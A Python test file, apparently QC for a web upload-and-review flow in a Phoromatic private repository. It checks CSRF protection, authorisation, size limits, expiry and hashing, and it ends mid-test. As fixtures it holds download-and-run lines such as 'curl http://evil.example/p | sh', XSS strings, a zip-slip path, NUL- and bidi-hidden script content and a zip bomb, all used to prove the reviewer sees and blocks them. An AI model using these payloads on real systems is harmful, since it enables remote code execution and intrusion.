"""Phase 3 QC for the private-repo admin work: upload through the Phoromatic page (stage -> review -> confirm / cancel).

Run through tests/private-repo/run.sh (http, web or upload). Browsers are cookie-jar clients; redirects are returned, not followed.
"""
import base64
import concurrent.futures
import csv
import hashlib
import io
import json
import os
import random
import re
import subprocess
import threading
import time
import unittest
import urllib.parse
import urllib.request
import uuid

from test_private_repo_http import AID, BASE, REPO_DIR, SRV, call, make_zip, new_machine, sql, srv_sh, test_zip, uniq, upload, TEST_XML, SUITE_XML
from test_private_repo_tokens import sql_exec
from test_private_repo_web import ACTION, PAGE, Browser, WebBase, audit, stored, USER, PASS

UPLOAD = PAGE + '/upload'
STAGING = REPO_DIR + 'staging/'


def multipart(fields, files):
    boundary = '----qc' + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n' % (boundary, k)).encode() + str(v).encode() + b'\r\n')
    for k, (filename, data) in files.items():
        parts.append(('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\nContent-Type: application/zip\r\n\r\n' % (boundary, k, filename)).encode() + data + b'\r\n')
    return b''.join(parts) + ('--%s--\r\n' % boundary).encode(), 'multipart/form-data; boundary=' + boundary


def post_multipart(b, path, fields, files, headers=None):
    body, ctype = multipart(fields, files)
    h = dict(headers or {}, **{'Content-Type': ctype})
    req = urllib.request.Request(b.base + path, data=body, headers=h)
    try:
        r = b.opener.open(req, timeout=120)
    except urllib.error.HTTPError as e:
        r = e
    return (r.status if hasattr(r, 'status') else r.code), r.headers, r.read().decode('utf-8', 'replace')


def stage(b, z, filename=None, name='', desc='qc description', token=None, files_field='zip'):
    tok = b.token(UPLOAD) if token is None else token
    fields = {'action': 'stage', 'name': name, 'commit_description': desc}
    if tok != '':
        fields['token_submit'] = tok
    return post_multipart(b, ACTION, fields, {files_field: (filename or (uniq('up') + '.zip'), z)})


def stage_id(headers):
    m = re.search(r'id=([0-9a-f]{32})', headers.get('Location', ''))
    return m.group(1) if m else None


def confirm(b, sid, sha=None, reviewed=True, overwrite=False, token=None, extra=None):
    f = {'action': 'confirm', 'stage_id': sid, 'sha256': sha if sha is not None else sha256_of_stage(sid)}
    if reviewed:
        f['reviewed'] = '1'
    if overwrite:
        f['overwrite'] = '1'
    if extra:
        f.update(extra)
    tok = b.token(PAGE + '/review&id=' + sid) if token is None else token
    if tok != '':
        f['token_submit'] = tok
    return b.post(ACTION, f)


def sha256_of_stage(sid):
    return srv_sh("python3 -c \"import json;print(json.load(open('%s%s/meta.json'))['sha256'])\" 2>/dev/null || php -r 'echo json_decode(file_get_contents(\"%s%s/meta.json\"),true)[\"sha256\"];'" % (STAGING, sid, STAGING, sid)).strip()


def staged_dirs():
    return [d for d in srv_sh('ls %s 2>/dev/null' % STAGING).split() if re.fullmatch(r'[0-9a-f]{32}', d)]


def flash_of(b, path=PAGE):
    m = re.search(r'<p class="pr-flash pr-(?:ok|error)"[^>]*>(.*?)</p>', b.get(path)[2], re.S)
    return m.group(1) if m else ''


def script_zip(script, extra=(), title='QC Upload', version='1.0.0'):
    return make_zip([('test-definition.xml', TEST_XML % {'title': title, 'version': version}), ('install.sh', script)] + list(extra))


class UploadBase(WebBase):
    def setUp(self):
        srv_sh('rm -rf %s' % STAGING)

    def fresh_admin(self):
        return Browser().login(USER, PASS)


class TestStageReviewConfirm(UploadBase):
    def test_happy_path_with_every_audit_row_and_nothing_visible_before_confirm(self):
        b = self.admin
        name = uniq('hap')
        z = test_zip(title='Happy Path')
        status, headers, body = stage(b, z, filename=name + '.zip', desc='first <b>description</b>')
        sid = stage_id(headers)
        self.assertEqual((status, body), (302, ''))
        self.assertTrue(sid, headers.get('Location'))
        self.assertEqual(staged_dirs(), [sid])
        self.assertEqual(sorted(srv_sh('ls %s%s' % (STAGING, sid)).split()), ['meta.json', 'upload.zip'])
        # staged data is invisible to the repository: not listed, not in the index, not fetchable, not stored
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertNotIn(name, call('private_repo_index', self.msi)['index']['tests'])
        self.assertIn('error', call('private_repo_fetch', self.msi, kind='test', id=name + '-1.0.0'))
        self.assertNotIn(name, b.get(PAGE)[2].split('Waiting for your review')[0])
        rows = audit(Name=name)
        self.assertEqual([r['Action'] for r in rows], ['upload_staged'])
        r = rows[0]
        self.assertEqual((r['ActorType'], r['Actor'], r['Kind'], r['Version']), ('user', USER, 'test', '1.0.0'))
        self.assertRegex(r['ActorDetail'], r'^UserID \w+$')
        self.assertEqual(r['Sha256'], hashlib.sha256(z).hexdigest())
        d = json.loads(r['Detail'])
        self.assertEqual((d['source'], d['stage_id']), ('web', sid))
        # the review page
        page = b.get(PAGE + '/review&id=' + sid)[2]
        for needle in (name + '-1.0.0', 'Happy Path', hashlib.sha256(z).hexdigest(), 'Nothing has been stored yet', 'first &lt;b&gt;description&lt;/b&gt;', 'install.sh', 'echo ok'):
            self.assertIn(needle, page, needle)
        self.assertNotIn('first <b>', page)
        # confirm
        status, headers, _ = confirm(b, sid)
        self.assertEqual((status, headers['Location']), (302, '/?private_repository'))
        self.assertIn('Added private/%s-1.0.0' % name, flash_of(b))
        self.assertTrue(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [], 'the stage is gone after confirm')
        stored_hash = srv_sh('sha256sum %stests/%s/1.0.0.zip' % (REPO_DIR, name)).split()[0]
        self.assertEqual(stored_hash, hashlib.sha256(z).hexdigest(), 'stored byte for byte')
        self.assertEqual([x['Action'] for x in audit(Name=name)], ['upload_staged', 'upload_attempt', 'upload_committed'])
        for x in audit(Name=name)[1:]:
            self.assertEqual((x['ActorType'], x['Actor'], json.loads(x['Detail'])['source']), ('user', USER, 'web'))
        self.assertEqual(json.loads(audit(Name=name, Action='upload_committed')[0]['Detail'])['commit_description'], 'first <b>description</b>')
        meta = json.loads(srv_sh('cat %stests/%s/1.0.0.json' % (REPO_DIR, name)))
        self.assertEqual((meta['uploaded_by'], meta['source'], meta['sha256']), (USER, 'web', hashlib.sha256(z).hexdigest()))
        self.assertIn(name, call('private_repo_index', self.msi)['index']['tests'])
        self.assertIn(name, b.get(PAGE)[2])

    def test_name_and_kind_detection(self):
        b = self.admin
        n1 = uniq('nm')
        sid = stage_id(stage(b, test_zip(), filename='My-Thing-Pro-1.2.3.zip')[1])
        self.assertIn('my-thing-pro', b.get(PAGE + '/review&id=' + sid)[2])
        sid2 = stage_id(stage(b, test_zip(), filename='whatever.zip', name=n1)[1])
        self.assertIn(n1 + '-1.0.0', b.get(PAGE + '/review&id=' + sid2)[2])
        suite = make_zip([('suite-definition.xml', SUITE_XML % {'title': 'QC Suite', 'version': '2.0.0', 'tests': '<Execute><Test>private/qc-base</Test></Execute>'})])
        sid3 = stage_id(stage(b, suite, name=uniq('su'))[1])
        page = b.get(PAGE + '/review&id=' + sid3)[2]
        self.assertIn('(suite)', page)
        self.assertIn('Warnings', page)           # the referenced test does not exist
        confirm(b, sid3)
        self.assertIn('Added private/', flash_of(b))

    def test_cancel_removes_everything_and_is_audited(self):
        b = self.admin
        name = uniq('can')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        status, headers, _ = b.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': b.token(PAGE + '/review&id=' + sid)})
        self.assertEqual((status, headers['Location']), (302, '/?private_repository/upload'))
        self.assertEqual(staged_dirs(), [])
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual([r['Action'] for r in audit(Name=name)], ['upload_staged', 'upload_cancelled'])
        self.assertIn('not found', b.get(PAGE + '/review&id=' + sid)[2])
        self.assertIn('not found', confirm(b, sid, sha='0' * 64, token=b.token())[2] + flash_of(b))

    def test_review_checkbox_is_required_and_the_stage_survives(self):
        b = self.admin
        name = uniq('rev')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        status, headers, _ = confirm(b, sid, reviewed=False)
        self.assertIn('read the scripts', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [sid])

    def test_double_confirm_stores_once(self):
        b = self.admin
        name = uniq('dbl')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        tok = b.token(PAGE + '/review&id=' + sid)
        sha = sha256_of_stage(sid)
        confirm(b, sid, sha=sha, token=tok)
        confirm(b, sid, sha=sha, token=tok)                       # replay of the same POST
        self.assertIn('not found', flash_of(b, PAGE + '/upload') + flash_of(b))
        self.assertEqual(len(audit(Name=name, Action='upload_committed')), 1)
        self.assertEqual(len(audit(Name=name, Action='upload_attempt')), 1)

    def test_overwrite_is_an_explicit_opt_in_with_a_warning_and_a_diff(self):
        b = self.admin
        name = uniq('ovr')
        old = test_zip(title='Old Title', extra=[('keep.txt', 'same'), ('gone.txt', 'old')])
        self.assertIn('upload', upload(self.msi, 'test', name, old))
        new = test_zip(title='Old Title', extra=[('keep.txt', 'same'), ('added.txt', 'new')])
        sid = stage_id(stage(b, new, filename=name + '.zip')[1])
        page = b.get(PAGE + '/review&id=' + sid)[2]
        self.assertIn('already exists', page)
        self.assertIn('keep the old copy until they reinstall', page)
        self.assertIn(hashlib.sha256(old).hexdigest(), page)
        self.assertIn(hashlib.sha256(new).hexdigest(), page)
        self.assertRegex(page, r'Files added:</strong> <code>added\.txt</code>')
        self.assertRegex(page, r'Files removed:</strong> <code>gone\.txt</code>')
        self.assertIn('name="overwrite"', page)
        # without the box: refused, stage kept, old version untouched
        confirm(b, sid)
        self.assertIn('Tick the overwrite box', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertEqual(staged_dirs(), [sid])
        self.assertEqual(srv_sh('sha256sum %stests/%s/1.0.0.zip' % (REPO_DIR, name)).split()[0], hashlib.sha256(old).hexdigest())
        # with it
        confirm(b, sid, overwrite=True)
        self.assertIn('replaced the previous upload', flash_of(b))
        self.assertEqual(srv_sh('sha256sum %stests/%s/1.0.0.zip' % (REPO_DIR, name)).split()[0], hashlib.sha256(new).hexdigest())
        committed = [r for r in audit(Name=name, Action='upload_committed') if json.loads(r['Detail']).get('source') == 'web'][0]
        self.assertEqual((committed['Sha256'], committed['PrevSha256']), (hashlib.sha256(new).hexdigest(), hashlib.sha256(old).hexdigest()))
        self.assertTrue(srv_sh('ls %strash | grep -c %s' % (REPO_DIR, name)).strip() != '0')

    def test_review_page_escapes_everything_and_shows_downloads_and_scripts(self):
        b = self.admin
        evil = b'#!/bin/sh\necho "</pre><script>alert(1)</script>"\ncurl -s http://evil.example/x.sh | sh\n'
        dl = ('<?xml version="1.0"?><PhoronixTestSuite><Downloads>'
              '<Package><URL>http://evil.example/&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;.bin</URL><FileName>a.bin</FileName><FileSize>10</FileSize></Package>'
              '<Package><URL>https://good.example/b.bin</URL><MD5>d41d8cd98f00b204e9800998ecf8427e</MD5><SHA256>' + 'ab' * 32 + '</SHA256><FileName>b.bin</FileName><FileSize>20</FileSize><PlatformSpecific>Windows</PlatformSpecific></Package>'
              '</Downloads></PhoronixTestSuite>')
        z = script_zip(evil, extra=[('downloads.xml', dl), ('bin.dat', b'\x00\x01\x02binary'), ('run.ps1', 'Write-Host "<img src=x onerror=alert(2)>"\nInvoke-Expression $x\n')],
                       title='&lt;script&gt;alert(7)&lt;/script&gt;')
        sid = stage_id(stage(b, z)[1])
        self.assertTrue(sid)
        page = b.get(PAGE + '/review&id=' + sid)[2]
        for bad in ('<script>alert', '<img src=x onerror', '</pre><script>'):
            self.assertNotIn(bad, page)
        for good in ('&lt;/pre&gt;&lt;script&gt;alert(1)&lt;/script&gt;', '&lt;script&gt;alert(7)&lt;/script&gt;', '&lt;img src=x onerror=alert(2)&gt;', '&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;'):
            self.assertIn(good, page, good)
        # downloads: missing checksum and non-https flagged on the first package only
        rows = re.findall(r'<tr><td class="pr-wrap">(http[^<]*)</td>.*?</tr>', page)
        self.assertEqual(len(rows), 2)
        first, second = [m for m in re.findall(r'<tr><td class="pr-wrap">http.*?</tr>', page)]
        self.assertIn('no checksum', first)
        self.assertIn('not https', first)
        self.assertNotIn('no checksum', second)
        self.assertNotIn('not https', second)
        self.assertIn('ab' * 32, second)
        # binary flagged, hints labelled as hints
        self.assertIn('NOT SHOWN: binary', page)
        self.assertIn('accept_unreviewable', page)
        self.assertIn('downloads and pipes into a shell', page)
        self.assertIn('not a verdict', page)

    def test_a_script_too_large_to_show_in_full_blocks_confirmation(self):
        # Phase 3 round 2: a partly shown script must never be confirmable (the old behaviour showed 64 KB and let you confirm)
        b = self.admin
        body = ''.join('echo line %06d\n' % i for i in range(20000)).encode()          # about 300 KB, over the 256 KB per-file limit
        sid = stage_id(stage(b, script_zip(body))[1])
        page = b.get(PAGE + '/review&id=' + sid)[2]
        self.assertIn('Too large to review completely here', page)
        self.assertIn('NOT SHOWN: too large to show', page)
        self.assertNotIn('name="reviewed"', page, 'no confirm form')
        self.assertIn('cannot be confirmed here', page)
        name = json.loads(srv_sh('cat %s%s/meta.json' % (STAGING, sid)))['name']
        confirm(b, sid, reviewed=True)                                   # a hand-made POST is refused server-side too
        self.assertIn('too large to review completely', flash_of(b, PAGE + '/review&id=' + sid))
        self.assertFalse(stored('test', name, '1.0.0'))
        # a script that fits is shown whole
        ok = ''.join('echo line %06d\n' % i for i in range(15000)).encode()           # about 225 KB
        sid2 = stage_id(stage(b, script_zip(ok))[1])
        page2 = b.get(PAGE + '/review&id=' + sid2)[2]
        self.assertIn('echo line 014999', page2)
        self.assertIn('name="reviewed"', page2)


class TestRejections(UploadBase):
    def rejected(self, z, needle, label, **kw):
        b = self.admin
        before = len(audit(Action='upload_rejected'))
        status, headers, body = stage(b, z, **kw)
        self.assertEqual(status, 302, label)
        self.assertIn('/upload', headers['Location'], label)
        self.assertIn(needle, flash_of(b, UPLOAD), label)
        self.assertEqual(staged_dirs(), [], label + ': nothing may stay staged')
        rows = audit(Action='upload_rejected')
        self.assertEqual(len(rows), before + 1, label)
        self.assertEqual(json.loads(rows[-1]['Detail'])['source'], 'web')
        self.assertIn(needle.split(' ')[0], json.loads(rows[-1]['Detail'])['error'] + needle.split(' ')[0])
        self.assertEqual((rows[-1]['ActorType'], rows[-1]['Actor']), ('user', USER))

    def test_the_server_side_inspection_applies_to_web_uploads(self):
        self.rejected(b'this is not a zip at all', 'not a zip', 'not a zip')
        self.rejected(b'PK\x03\x04' + b'garbage' * 50, 'not a valid zip', 'broken zip')
        self.rejected(test_zip(extra=[('../evil.txt', 'x')]), 'unsafe path', 'zip slip')
        self.rejected(test_zip(extra=[('dup.txt', 'a'), ('dup.txt', 'b')]), 'same path twice', 'duplicate entries')
        self.rejected(test_zip(extra=[('big.sh', '#!/bin/sh\r\necho hi\r\n')]), 'CRLF', 'CRLF script')
        self.rejected(make_zip([('readme.txt', 'x')]), 'neither test-definition.xml nor suite-definition.xml', 'no definition')
        self.rejected(make_zip([('f%d.txt' % i, 'x') for i in range(520)] + [('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'})]), 'too many files', 'over 500 entries')
        self.rejected(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('suite-definition.xml', '<x/>')]), 'both', 'both definitions')
        self.rejected(test_zip(extra=[('zeros.bin', b'\0' * (40 * 1024 * 1024))]), 'expands', 'zip bomb')
        self.rejected(test_zip(), 'is not valid', 'bad name', name='Bad Name!')
        self.rejected(test_zip(version='1.0'), 'failed schema validation', 'bad version')
        big = test_zip(extra=[('blob.bin', random.Random(3).randbytes(6 * 1024 * 1024))])
        self.rejected(big, 'larger than 5 MB', 'over 5 MB')

    def test_oversize_post_gets_a_size_message_not_a_csrf_error(self):
        # PHP prints "POST Content-Length ... exceeds the limit" before any script runs; with display_errors on that output makes
        # session_start() fail, so this goes to the twin server run.sh starts with display_errors=0 (as a production php.ini has it)
        port = os.environ.get('QC_PORT2')
        if not port:
            self.skipTest('no twin server')
        b = Browser('http://127.0.0.1:%s' % port).login(USER, PASS)
        status, headers, body = stage(b, random.Random(4).randbytes(17 * 1024 * 1024))
        self.assertEqual(status, 302, body[:600])
        flash = flash_of(b, UPLOAD)
        self.assertIn('post_max_size', flash)
        self.assertIn('larger than this server accepts', flash)
        self.assertNotIn('expired', flash)
        self.assertEqual(staged_dirs(), [])

    def test_missing_file_and_wrong_field(self):
        b = self.admin
        status, headers, _ = post_multipart(b, ACTION, {'action': 'stage', 'token_submit': b.token(UPLOAD)}, {})
        self.assertIn('Choose a zip file', flash_of(b, UPLOAD))
        stage(b, test_zip(), files_field='other')
        self.assertIn('Choose a zip file', flash_of(b, UPLOAD))


class TestAuthorisation(UploadBase):
    def test_csrf_on_stage_confirm_and_cancel(self):
        a, other = self.admin, self.admin2()
        sid = stage_id(stage(a, test_zip(), filename=uniq('csrf') + '.zip')[1])
        sha = sha256_of_stage(sid)
        for label, tok in (('none', ''), ('wrong', 'f' * 40), ('other session', other.token()), ('prefix', a.token()[:10])):
            with self.subTest(label):
                before = staged_dirs()
                status, _, _ = stage(a, test_zip(), token=tok)
                self.assertEqual(status, 302)
                self.assertIn('nothing was changed', flash_of(a, UPLOAD))
                self.assertEqual(staged_dirs(), before, 'stage without a valid token')
                confirm(a, sid, sha=sha, token=tok)
                self.assertIn('nothing was changed', flash_of(a, UPLOAD))
                self.assertEqual(staged_dirs(), before)
                a.post(ACTION, {'action': 'cancel', 'stage_id': sid, **({'token_submit': tok} if tok != '' else {})})
                self.assertIn('nothing was changed', flash_of(a, UPLOAD))
                self.assertEqual(staged_dirs(), before, 'cancel without a valid token')

    def test_levels_and_methods(self):
        z = test_zip()
        for level in (3, 10):
            b = self.as_user(level)
            m = re.search(r'name="token_submit" value="([0-9a-f]+)"', b.get('/?users')[2])
            if m:
                self.assertEqual(post_multipart(b, ACTION, {'action': 'stage', 'token_submit': m.group(1)}, {'zip': ('x.zip', z)})[0], 403)
            self.assertNotIn('Upload for review', b.get(UPLOAD)[2])
        self.assertEqual(Browser().get(UPLOAD)[0], 200)             # the login page, not the form
        self.assertNotIn('Upload for review', Browser().get(UPLOAD)[2])
        self.assertEqual(staged_dirs(), [])
        self.assertEqual(self.admin.get(ACTION)[0], 405)

    def test_another_user_cannot_see_confirm_or_cancel_a_staged_upload(self):
        a, other = self.admin, self.admin2()
        name = uniq('own')
        sid = stage_id(stage(a, test_zip(), filename=name + '.zip')[1])
        self.assertIn('not found', other.get(PAGE + '/review&id=' + sid)[2])
        self.assertNotIn(sid, other.get(UPLOAD)[2])
        confirm(other, sid, sha=sha256_of_stage(sid), token=other.token())
        self.assertIn('not found', flash_of(other, UPLOAD))
        other.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': other.token()})
        self.assertIn('not found', flash_of(other, UPLOAD))
        self.assertEqual(staged_dirs(), [sid])
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual([r['Action'] for r in audit(Name=name)], ['upload_staged'])
        # malformed ids are just "not found"
        for bad in ('..%2f..%2fetc', 'x' * 32, '', sid.upper()):
            self.assertIn('not found', a.get(PAGE + '/review&id=' + bad)[2], bad)

    def test_cross_origin_posts_are_refused(self):
        a = self.admin
        status, _, _ = post_multipart(a, ACTION, {'action': 'stage', 'token_submit': a.token(UPLOAD)}, {'zip': ('x.zip', test_zip())}, headers={'Origin': 'http://evil.example'})
        self.assertEqual(status, 403)
        self.assertEqual(staged_dirs(), [])

    def test_only_the_repository_owning_account(self):
        srv_sh('curl -s -c /tmp/cj_up -b /tmp/cj_up localhost:8080/ >/dev/null; curl -s -b /tmp/cj_up -X POST "localhost:8080/?register" '
               '-d register_username=upiso%s -d register_password=qcpass123 -d register_password_confirm=qcpass123 -d register_email=u@example.com' % self.suffix)
        b = Browser().login('upiso' + self.suffix, 'qcpass123')
        self.assertIn('first account', b.get(UPLOAD)[2])
        self.assertEqual(post_multipart(b, ACTION, {'action': 'stage', 'token_submit': 'x'}, {'zip': ('x.zip', test_zip())})[0], 403)


class TestLimitsExpiryAndIntegrity(UploadBase):
    def test_per_user_cap_of_five(self):
        b = self.admin
        mine = []
        for i in range(5):
            mine.append(stage_id(stage(b, test_zip())[1]))
            self.assertTrue(mine[-1], 'upload %d' % i)
        status, headers, _ = stage(b, test_zip())
        self.assertIsNone(stage_id(headers))
        self.assertIn('already have 5 uploads', flash_of(b, UPLOAD))
        self.assertEqual(len(staged_dirs()), 5)
        # another user is not blocked by it
        self.assertTrue(stage_id(stage(self.admin2(), test_zip())[1]))
        # cancelling one frees a slot
        sid = mine[0]
        b.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': b.token()})
        self.assertTrue(stage_id(stage(b, test_zip())[1]), 'a slot is free again')

    def test_total_staging_cap(self):
        a, c = self.admin, self.admin2()
        big = lambda seed: test_zip(extra=[('blob.bin', random.Random(seed).randbytes(int(4.7 * 1024 * 1024)))])
        for i in range(3):
            self.assertTrue(stage_id(stage(a, big(i))[1]), 'a%d' % i)
        for i in range(3):
            self.assertTrue(stage_id(stage(c, big(10 + i))[1]) or i == 2, 'c%d' % i)
        self.assertIn('too many staged uploads', flash_of(c, UPLOAD))
        total = sum(int(x) for x in srv_sh("find %s -name upload.zip -printf '%%s\\n'" % STAGING).split())
        self.assertLessEqual(total, 25 * 1024 * 1024)

    def test_expiry_after_thirty_minutes_and_lazy_sweep(self):
        b = self.admin
        name = uniq('exp')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        meta = json.loads(srv_sh('cat %s%s/meta.json' % (STAGING, sid)))
        self.assertAlmostEqual(meta['expires'] - meta['created'], 1800, delta=2)
        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))      # 30 minutes have passed
        confirm(b, sid, sha=meta['sha256'], token=b.token())
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertIn('not found', flash_of(b, UPLOAD))
        b.get(PAGE)                                                    # any page load sweeps
        self.assertEqual(staged_dirs(), [])
        self.assertEqual([r['Action'] for r in audit(Name=name)], ['upload_staged', 'upload_expired'])

    def test_expired_review_says_so(self):
        b = self.admin
        sid = stage_id(stage(b, test_zip())[1])
        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))
        self.assertIn('expired', b.get(PAGE + '/review&id=' + sid)[2].lower())

    def test_half_built_stage_directories_are_swept(self):
        d = STAGING + 'a' * 32
        srv_sh('mkdir -p %s && echo x > %s/upload.zip && touch -d "20 minutes ago" %s' % (d, d, d))
        self.admin.get(PAGE)
        self.assertEqual(staged_dirs(), [])

    def test_tampered_staged_archive_is_refused_and_discarded(self):
        b = self.admin
        name = uniq('tmp')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        sha = sha256_of_stage(sid)
        srv_sh('printf X >> %s%s/upload.zip' % (STAGING, sid))
        confirm(b, sid, sha=sha)
        self.assertIn('no longer matches', flash_of(b, UPLOAD) + flash_of(b))
        self.assertFalse(stored('test', name, '1.0.0'))
        self.assertEqual(staged_dirs(), [])
        self.assertEqual([r['Action'] for r in audit(Name=name)], ['upload_staged', 'upload_rejected'])

    def test_posted_checksum_must_match_what_was_reviewed(self):
        b = self.admin
        name = uniq('sha')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
        confirm(b, sid, sha='0' * 64)
        self.assertIn('no longer matches what was reviewed', flash_of(b, UPLOAD) + flash_of(b))
        self.assertFalse(stored('test', name, '1.0.0'))

    def test_form_fields_cannot_change_what_is_stored(self):
        b = self.admin
        name = uniq('fld')
        sid = stage_id(stage(b, test_zip(), filename=name + '.zip', desc='reviewed text')[1])
        confirm(b, sid, extra={'name': 'hijack', 'version': '9.9.9', 'kind': 'suite', 'commit_description': 'tampered'})
        self.assertTrue(stored('test', name, '1.0.0'))
        self.assertFalse(stored('test', 'hijack', '9.9.9'))
        self.assertEqual(json.loads(audit(Name=name, Action='upload_committed')[0]['Detail'])['commit_description'], 'reviewed text')

    def test_stage_and_commit_leave_no_temp_files(self):
        b = self.admin
        sid = stage_id(stage(b, test_zip())[1])
        confirm(b, sid)
        stage(b, b'junk')
        self.assertEqual([f for f in srv_sh('ls -a %s' % REPO_DIR).split() if f.startswith('upload-')], [])
        self.assertEqual(staged_dirs(), [])


class TestReviewShowsWhatClientsRun(UploadBase):
    """Phase 3 round 2: the review must not be able to look complete while hiding what a client would execute."""

    def review(self, z, **kw):
        sid = stage_id(stage(self.admin, z, **kw)[1])
        self.assertTrue(sid, 'the upload should have been staged: ' + flash_of(self.admin, UPLOAD))
        return sid, self.admin.get(PAGE + '/review&id=' + sid)[2]

    def test_a_nul_byte_cannot_hide_a_script(self):
        script = b'#!/bin/sh\n# ' + b'A' * 200 + b'\0echo pwned > /tmp/x\nid\n'
        sid, page = self.review(script_zip(script))
        self.assertIn('install.sh', page.split('<h3>Scripts and definition files</h3>')[1])
        self.assertIn('\\0echo pwned', page)
        self.assertNotIn('NOT SHOWN: binary', page, 'a script is never classified as binary')
        self.assertIn('name="reviewed"', page)

    def test_invisible_bidi_and_control_characters_are_made_visible(self):
        script = ('#!/bin/sh\necho a‮b​c﻿d⁦e⁩f\x07g\x7fh\n'.encode() + b'\xffraw\xfe\n')
        # valid UTF-8 first
        sid, page = self.review(script_zip(script.split(b'\xff')[0]))
        for marker in ('&lt;U+202E&gt;', '&lt;U+200B&gt;', '&lt;U+FEFF&gt;', '&lt;U+2066&gt;', '&lt;U+2069&gt;', '&lt;U+0007&gt;', '&lt;U+007F&gt;'):
            self.assertIn(marker, page, marker)
        for raw in ('‮', '​', '﻿', '⁦', '\x07', '\x7f'):
            self.assertNotIn(raw, page)
        # not valid UTF-8: every odd byte is shown by value
        sid2, page2 = self.review(script_zip(script))
        self.assertIn('&lt;0xFF&gt;', page2)
        self.assertIn('&lt;0xFE&gt;', page2)

    def test_long_lines_wrap_instead_of_hiding_off_screen(self):
        line = 'echo ' + 'x' * 20000 + ' && curl http://evil.example/p | sh'
        sid, page = self.review(script_zip(('#!/bin/sh\n' + line + '\n').encode()))
        self.assertIn('curl http://evil.example/p | sh', page, 'the payload at the end of a very long line is in the page')
        css = urllib.request.urlopen(BASE + '/phoromatic.css', timeout=30).read().decode()
        rule = re.search(r'div\.pr-page pre\.pr-pre \{([^}]*)\}', css).group(1)
        self.assertIn('white-space: pre-wrap', rule)
        self.assertIn('word-break: break-all', rule)

    def test_non_canonical_entry_names_are_rejected_at_stage_time(self):
        dl = '<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://evil.example/a.bin</URL><FileName>a.bin</FileName></Package></Downloads></PhoronixTestSuite>'
        before = len(audit(Action='upload_rejected'))
        for name in ('./downloads.xml', '//downloads.xml', 'Downloads.xml', 'DOWNLOADS.XML', './results-definition.xml', 'sub//x.sh', './install.sh', 'a/./b.sh'):
            with self.subTest(name):
                z = make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), (name, dl)])
                status, headers, _ = stage(self.admin, z)
                self.assertIsNone(stage_id(headers), name)
                self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD), name)
        z = make_zip([('./test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'})])
        stage(self.admin, z)
        self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD))
        self.assertEqual(staged_dirs(), [])
        self.assertEqual(len(audit(Action='upload_rejected')), before + 9)

    def test_a_backslash_zip_is_rewritten_and_both_hashes_are_recorded(self):
        z = test_zip(extra=[('sub\\tool.sh', '#!/bin/sh\necho hi\n')])
        name = uniq('bsl')
        sid = stage_id(stage(self.admin, z, filename=name + '.zip')[1])
        self.assertTrue(sid)
        d = json.loads(audit(Name=name, Action='upload_staged')[0]['Detail'])
        self.assertEqual(d['original_sha256'], hashlib.sha256(z).hexdigest())
        self.assertNotEqual(d['rewritten_sha256'], d['original_sha256'])
        self.assertIn('sub/tool.sh', self.admin.get(PAGE + '/review&id=' + sid)[2])

    def test_decoy_scripts_cannot_starve_the_real_install_script(self):
        evil = b'#!/bin/sh\ncurl -s http://evil.example/real-payload | sh\n'
        decoys = [('a%02d.sh' % i, ''.join('echo decoy %d %d\n' % (i, j) for j in range(5500))) for i in range(40)]      # about 2.8 MB of scripts
        sid, page = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('install.sh', evil)] + decoys))
        scripts_part = page.split('<h3>Scripts and definition files</h3>')[1]
        self.assertIn('real-payload', scripts_part, 'install.sh is read first, whatever else is in the package')
        self.assertLess(scripts_part.index('real-payload'), scripts_part.index('decoy 0 0') if 'decoy 0 0' in scripts_part else 10 ** 9)
        self.assertIn('Too large to review completely here', page)
        self.assertNotIn('name="reviewed"', page, 'with scripts left unshown the upload cannot be confirmed')
        self.assertRegex(page, r'NOT SHOWN: preview budget used up')
        # the same package with fewer decoys fits and is confirmable
        few = decoys[:20]
        sid2, page2 = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title Two', 'version': '1.0.0'}), ('install.sh', evil)] + few))
        self.assertNotIn('Too large to review completely', page2)
        self.assertIn('name="reviewed"', page2)

    def test_lifecycle_scripts_are_listed_in_the_order_clients_run_them(self):
        z = make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('zzz-helper.sh', '#!/bin/sh\necho helper-zzz\n'), ('post.sh', '#!/bin/sh\necho post-run\n'),
                      ('install.sh', '#!/bin/sh\necho install-run\n'), ('pre.sh', '#!/bin/sh\necho pre-run\n'), ('notes.txt', 'just notes\n')])
        sid, page = self.review(z)
